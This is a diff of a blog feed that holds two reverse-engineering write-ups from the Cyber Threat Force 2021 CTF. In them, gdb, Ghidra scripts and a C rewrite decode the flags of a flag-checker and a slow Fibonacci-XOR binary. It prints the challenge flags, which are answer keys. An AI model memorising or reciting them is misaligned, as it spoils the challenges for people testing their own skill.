+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ gdb ./program
 gef➤ &lt;span style="color:#75715e"># Break right before camlReverse__string2char_211 is called.&lt;/span>
 gef➤ b *0x0000555555574278
 gef➤ r ABCDEFG
@@ -690,7 +690,7 @@ gef➤ &lt;span style="color:#75715e"># When we&amp;#39;re back into main, we se
 gef➤ x/2x $rax
 0x7ffff7c7fd30: 0x00000083 0x00000000
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>Looking at the function in Ghidra, it seems recursive:&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">camlReverse__string2char_211&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>) {
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">camlReverse__string2char_211&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>) {
 &lt;span style="color:#66d9ef">long&lt;/span> in_RAX;
 camlReverse__string2char_tmp_214
 (&lt;span style="color:#ae81ff">1&lt;/span>,&lt;span style="color:#f92672">*&lt;/span>(undefined &lt;span style="color:#f92672">*&lt;/span>)(in_RAX &lt;span style="color:#f92672">+&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>(ulong &lt;span style="color:#f92672">*&lt;/span>)(in_RAX &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>) &lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">10&lt;/span>) &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>));
@@ -721,7 +721,7 @@ lVar1 &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#f92672"
 caml_ml_array_bound_error();
 }
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>The most interesting part is the &lt;code>* 2 + 1&lt;/code> operation. Our &lt;code>0x83&lt;/code> value really is &lt;code>0x41 * 2 + 1&lt;/code>. If we show a bit more of the memory, we can find the other chars:&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">gef➤ x/64x $rax
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">gef➤ x/64x $rax
 0x7ffff7c7fd30: 0x00000083 0x00000000 0xf7c7fd48 0x00007fff
 0x7ffff7c7fd40: 0x00000800 0x00000000 0x00000085 0x00000000
 0x7ffff7c7fd50: 0xf7c7fd60 0x00007fff 0x00000800 0x00000000
@@ -740,14 +740,14 @@ caml_ml_array_bound_error();
 0x7ffff7c7fe20: 0xf7c7fe40 0x00007fff 0x00000081 0x00000000
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>We have &lt;code>0x83, 0x85, 0x87, ...&lt;/code>. This maps to our input, meaning we can get the start of the flag by decoding these values.&lt;/p>
 &lt;p>Also, we notice that each value has a pointer to the next one, meaning this is a linked list. We can build a first script to decode the start of the flag:&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> struct
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> struct
 &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">getUBytes&lt;/span>(address, length):
 &lt;span style="color:#66d9ef">return&lt;/span> bytearray([b &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">0xff&lt;/span> &lt;span style="color:#66d9ef">for&lt;/span> b &lt;span style="color:#f92672">in&lt;/span> getBytes(address, length)])
 &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">u32&lt;/span>(raw_bytes):
 &lt;span style="color:#66d9ef">return&lt;/span> struct&lt;span style="color:#f92672">.&lt;/span>unpack(&lt;span style="color:#e6db74">&amp;#39;&amp;lt;L&amp;#39;&lt;/span>, raw_bytes)[&lt;span style="color:#ae81ff">0&lt;/span>]
 &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">read_caml_array&lt;/span>(pointer, data_len):
 array &lt;span style="color:#f92672">=&lt;/span> []
-&lt;span style="color:#66d9ef">while&lt;/span> True:
+&lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#66d9ef">True&lt;/span>:
 &lt;span style="color:#66d9ef">try&lt;/span>:
 array&lt;span style="color:#f92672">.&lt;/span>append(getUBytes(toAddr(pointer), data_len))
 &lt;span style="color:#66d9ef">except&lt;/span>:
@@ -757,13 +757,13 @@ pointer &lt;span style="color:#f92672">=&lt;/span> u32(getBytes(toAddr(pointer &
 &lt;span style="color:#75715e"># The address refers to the argument passed to camlReverse__firstCheck_268.&lt;/span>
 &lt;span style="color:#75715e"># For each value, map the bytes to an int, divide by two, and cast to char.&lt;/span>
 flag_start &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>join(chr(u32(b) &lt;span style="color:#f92672">//&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>) &lt;span style="color:#66d9ef">for&lt;/span> b &lt;span style="color:#f92672">in&lt;/span> read_caml_array(&lt;span style="color:#ae81ff">0x00160898&lt;/span>, &lt;span style="color:#ae81ff">4&lt;/span>))
-&lt;span style="color:#66d9ef">print&lt;/span>(flag_start)
-&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">extractCaml&lt;span style="color:#f92672">.&lt;/span>py&lt;span style="color:#f92672">&amp;gt;&lt;/span> Running&lt;span style="color:#f92672">...&lt;/span>
+print(flag_start)
+&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">extractCaml&lt;span style="color:#f92672">.&lt;/span>py&lt;span style="color:#f92672">&amp;gt;&lt;/span> Running&lt;span style="color:#f92672">...&lt;/span>
 CYBERTF{Go
 extractCaml&lt;span style="color:#f92672">.&lt;/span>py&lt;span style="color:#f92672">&amp;gt;&lt;/span> Finished&lt;span style="color:#960050;background-color:#1e0010">!&lt;/span>
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>When reversing the &lt;code>* 2 + 1&lt;/code> operation, all we really have to do is &lt;code>// 2&lt;/code> (because it is an integer division).&lt;/p>
 &lt;p>We can now finish the job by extracting the XOR key &amp;amp; data, which are stored using the same array format:&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> struct
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> struct
 &lt;span style="color:#f92672">import&lt;/span> itertools
 &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">getUBytes&lt;/span>(address, length):
 &lt;span style="color:#66d9ef">return&lt;/span> bytearray([b &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">0xff&lt;/span> &lt;span style="color:#66d9ef">for&lt;/span> b &lt;span style="color:#f92672">in&lt;/span> getBytes(address, length)])
@@ -771,7 +771,7 @@ extractCaml&lt;span style="color:#f92672">.&lt;/span>py&lt;span style="color:#f9
 &lt;span style="color:#66d9ef">return&lt;/span> struct&lt;span style="color:#f92672">.&lt;/span>unpack(&lt;span style="color:#e6db74">&amp;#39;&amp;lt;L&amp;#39;&lt;/span>, raw_bytes)[&lt;span style="color:#ae81ff">0&lt;/span>]
 &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">read_caml_array&lt;/span>(pointer, data_len):
 array &lt;span style="color:#f92672">=&lt;/span> []
-&lt;span style="color:#66d9ef">while&lt;/span> True:
+&lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#66d9ef">True&lt;/span>:
 &lt;span style="color:#66d9ef">try&lt;/span>:
 array&lt;span style="color:#f92672">.&lt;/span>append(getUBytes(toAddr(pointer), data_len))
 &lt;span style="color:#66d9ef">except&lt;/span>:
@@ -789,15 +789,15 @@ xor_key &lt;span style="color:#f92672">=&lt;/span> [u32(x) &lt;span style="color
 xor_data &lt;span style="color:#f92672">=&lt;/span> [u32(x) &lt;span style="color:#66d9ef">for&lt;/span> x &lt;span style="color:#f92672">in&lt;/span> read_caml_array(&lt;span style="color:#ae81ff">0x00160208&lt;/span>, &lt;span style="color:#ae81ff">4&lt;/span>)]
 &lt;span style="color:#75715e"># Xor the key with the data, and divide each value by two before converting it to a char.&lt;/span>
 flag_end &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>join(chr((a &lt;span style="color:#f92672">^&lt;/span> b) &lt;span style="color:#f92672">//&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>) &lt;span style="color:#66d9ef">for&lt;/span> a, b &lt;span style="color:#f92672">in&lt;/span> zip(itertools&lt;span style="color:#f92672">.&lt;/span>cycle(xor_key), xor_data))
-&lt;span style="color:#66d9ef">print&lt;/span>(flag_start &lt;span style="color:#f92672">+&lt;/span> flag_end)
-&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">extractCaml&lt;span style="color:#f92672">.&lt;/span>py&lt;span style="color:#f92672">&amp;gt;&lt;/span> Running&lt;span style="color:#f92672">...&lt;/span>
+print(flag_start &lt;span style="color:#f92672">+&lt;/span> flag_end)
+&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">extractCaml&lt;span style="color:#f92672">.&lt;/span>py&lt;span style="color:#f92672">&amp;gt;&lt;/span> Running&lt;span style="color:#f92672">...&lt;/span>
 CYBERTF{Golang_is_D3&lt;span style="color:#a6e22e">@d_1n_CTF_1795b4a89708371d16982195642638cd7783998188&lt;/span>}
 extractCaml&lt;span style="color:#f92672">.&lt;/span>py&lt;span style="color:#f92672">&amp;gt;&lt;/span> Finished&lt;span style="color:#960050;background-color:#1e0010">!&lt;/span>
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>I have to say, the API doesn&amp;rsquo;t seem too intuitive, but at least it is powerful.&lt;/p>
 &lt;h2 id="more">More&lt;/h2>
 &lt;p>You can &lt;a href="https://github.com/vivescere/ctf/tree/main/cyber-threat-force-2021/reverse/flag-checker">view the sources on github&lt;/a> or &lt;a href="https://nicolasb.fr/blog/cyber-threat-force-ctf/">read other writeups&lt;/a>.&lt;/p></content></item><item><title>Writeup Cyber Threat Force : Take your time</title><link>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-reverse-take-your-time/</link><pubDate>Thu, 08 Jul 2021 23:01:09 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-reverse-take-your-time/</guid><description>For this challenge, we were given a TakeYourTime executable, which seems to hang when we run it. We can analyze its code using ghidra:
 unsigned int FLAG[] = { 0xb5, 0x63, 0x98, 0x3d, 0xb5, 0x06, 0x46, 0xba, 0x0f, 0xd5, 0x47, 0xce, 0x97, 0xef, 0x7b, 0x28, 0xdb, 0xe7, 0x39, 0x10, 0xb0, 0xf5, 0x44, 0xec, 0x30, 0x88, 0x46, 0xf6, 0x88, }; undefined8 main(void) { byte bVar1; int iVar2; uint local_28; int local_24; ulong local_20; local_28 = 0; local_20 = 0x32; while (local_20 &amp;lt; 0x4f) { bVar1 = fibonacci(); local_28 = local_28 &amp;gt;&amp;gt; 8 | (local_28 ^ bVar1) &amp;lt;&amp;lt; 0x18; local_20 = local_20 + 1; } srand(local_28); local_24 = 0; while (local_24 &amp;lt; 0x1d) { bVar1 = FLAG[local_24]; iVar2 = rand(); putchar((uint)bVar1 ^ iVar2 % 0xff); local_24 = local_24 + 1; } puts(&amp;#34;\nGood you can validate the chall with this password ;)!</description><content>&lt;p>For this challenge, we were given a &lt;code>TakeYourTime&lt;/code> executable, which seems to hang when we run it. We can analyze its code using ghidra:&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> FLAG[] &lt;span style="color:#f92672">=&lt;/span> {
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> FLAG[] &lt;span style="color:#f92672">=&lt;/span> {
 &lt;span style="color:#ae81ff">0xb5&lt;/span>, &lt;span style="color:#ae81ff">0x63&lt;/span>, &lt;span style="color:#ae81ff">0x98&lt;/span>, &lt;span style="color:#ae81ff">0x3d&lt;/span>,
 &lt;span style="color:#ae81ff">0xb5&lt;/span>, &lt;span style="color:#ae81ff">0x06&lt;/span>, &lt;span style="color:#ae81ff">0x46&lt;/span>, &lt;span style="color:#ae81ff">0xba&lt;/span>,
 &lt;span style="color:#ae81ff">0x0f&lt;/span>, &lt;span style="color:#ae81ff">0xd5&lt;/span>, &lt;span style="color:#ae81ff">0x47&lt;/span>, &lt;span style="color:#ae81ff">0xce&lt;/span>,
@@ -851,7 +851,7 @@ lVar1 &lt;span style="color:#f92672">=&lt;/span> lVar1 &lt;span style="color:#f9
 }
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>What&amp;rsquo;s happening there is that the program takes too long to execute: the fibonacci implementation is a naive one (recursive).&lt;/p>
 &lt;p>Let&amp;rsquo;s be as lazy as possible and rewrite the program hardcoding the values that are needed:&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
 &lt;/span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
 &lt;/span>&lt;span style="color:#75715e">&lt;/span>
 &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">fibo&lt;/span>(&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> param) {
@@ -910,7 +910,7 @@ putchar((&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color
 puts(&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>);
 &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
 }
-&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ gcc solve.c -o solve
+&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ gcc solve.c -o solve
 ... &lt;span style="color:#f92672">(&lt;/span>lots of warnings&lt;span style="color:#f92672">)&lt;/span>
 $ ./solve
 CYBERTF&lt;span style="color:#f92672">{&lt;/span>Fuck_Fibo_3v3ryWhere&lt;span style="color:#f92672">}&lt;/span>
